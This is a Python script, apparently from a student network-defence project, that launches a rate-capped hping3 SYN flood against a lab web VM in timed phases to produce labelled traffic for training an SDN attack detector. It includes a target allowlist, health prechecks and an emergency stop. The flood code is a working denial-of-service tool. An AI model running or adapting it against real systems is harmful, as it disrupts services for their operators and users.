#!/usr/bin/env python3
"""A06 — SYN Flood (có kiểm soát, chỉ trong lab).

Mục đích: bổ sung loại tấn công theo đề cương (mục 2.2.2). SYN tới cổng TCP của
vm-web sinh nhiều flow mới → Packet-In (và Flow-Mod nếu switch reactive), đồng thời
làm tỉ lệ SYN/ACK trên mặt phẳng dữ liệu lệch hẳn → đặc trưng phân biệt tốt.

An toàn (bắt buộc, vì đây là lab tự dựng cho đồ án phòng thủ):
  - Chỉ nhắm vm-web (192.168.200.12), chặn mọi đích khác.
  - Giới hạn tốc độ (mặc định ≤ 200 pps) và tổng thời lượng.
  - Precheck sức khỏe controller + web trước khi chạy; dừng nếu không đạt.
  - Dùng hping3 (ưu tiên) với -c để chặn tổng số gói mỗi pha.

Cần quyền root (raw socket): chạy bằng sudo. Chạy trên vm-attacker.
"""
import argparse
import shutil
import subprocess
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "common"))
from groundtruth import GroundTruth, add_src_arg, assert_target_allowed, now_iso  # noqa: E402

TARGET = "192.168.200.12"
TCP_PORT = 8080             # dịch vụ HTTP sẵn có trên vm-web
CONTROLLER = "http://10.10.0.10:8181/rests/data/opendaylight-inventory:nodes"
WEB_HTTP = f"http://{TARGET}:{TCP_PORT}/"

RATE_CAP = 200              # chặn trên tốc độ (pps)
# (name, begin_s, end_s, rate_pps, label)
PHASES = [
    ("baseline", 0, 120, 0, 0),
    ("P1", 120, 300, 50, 1),
    ("P2", 300, 480, 100, 1),
    ("P3", 480, 660, 200, 1),
    ("recovery", 660, 780, 0, 0),
]


def health_ok():
    ctrl = False
    web = False
    try:
        urllib.request.urlopen(CONTROLLER, timeout=3)
        ctrl = True
    except urllib.error.HTTPError as e:
        ctrl = e.code in (401, 200)
    except Exception:
        ctrl = False
    try:
        with urllib.request.urlopen(WEB_HTTP, timeout=3) as r:
            web = r.status == 200
    except Exception:
        web = False
    print(f"{now_iso()} HEALTH controller={ctrl} web={web}", flush=True)
    return ctrl and web


def run_hping_phase(rate, duration):
    """Chạy hping3 SYN có giới hạn số gói = rate*duration."""
    interval_us = max(1, int(1_000_000 / rate))
    count = rate * duration
    cmd = [
        "hping3", "-S",
        "-p", str(TCP_PORT),
        "-i", f"u{interval_us}",
        "-c", str(count),
        TARGET,
    ]
    print(f"{now_iso()} EXEC {' '.join(cmd)}", flush=True)
    # hping3 tự kết thúc sau khi gửi đủ count; đặt timeout dự phòng.
    subprocess.run(cmd, timeout=duration + 30,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run", required=True, help="run_id, vd A06-R1")
    ap.add_argument("--out-dir", default=None)
    add_src_arg(ap, "192.168.200.13")  # hping3 tự lấy IP theo route; --src chỉ để ghi nhận
    ap.add_argument("--yes", action="store_true",
                    help="xác nhận đã đọc phần an toàn và đang ở lab")
    args = ap.parse_args()

    assert_target_allowed(TARGET)
    if not args.yes:
        raise SystemExit(
            "Cần cờ --yes để xác nhận chạy trong lab cô lập của nhóm."
        )
    if shutil.which("hping3") is None:
        raise SystemExit(
            "Chưa có hping3. Cài: sudo apt-get install -y hping3"
        )
    for name, _, _, rate, _ in PHASES:
        if rate > RATE_CAP:
            raise SystemExit(f"Pha {name} vượt RATE_CAP={RATE_CAP} pps")

    # Precheck sức khỏe 3 lần.
    for _ in range(3):
        if not health_ok():
            raise SystemExit("Precheck thất bại — dừng, không chạy.")
        time.sleep(2)

    gt = GroundTruth(
        run_id=args.run, scenario="A06", target=TARGET,
        generator="synflood_a06.py", phases=PHASES,
        default_label=1, out_dir=args.out_dir, source=args.src,
    ).begin()

    start = time.monotonic()
    try:
        for name, begin_s, end_s, rate, label in PHASES:
            while time.monotonic() - start < begin_s:
                time.sleep(0.05)
            duration = end_s - begin_s
            if rate <= 0:
                # pha nghỉ: giám sát sức khỏe, không gửi.
                t0 = time.monotonic()
                while time.monotonic() - t0 < duration:
                    time.sleep(5)
                    health_ok()
            else:
                run_hping_phase(rate, duration)
                gt.total_sent += rate * duration
                # Kiểm tra web còn sống sau pha; nếu chết thì dừng sớm.
                if not health_ok():
                    print("EMERGENCY_STOP web/controller mất kết nối", flush=True)
                    break
            print(f"PHASE={name} rate={rate} label={label} done", flush=True)
    finally:
        gt.finish()


if __name__ == "__main__":
    main()
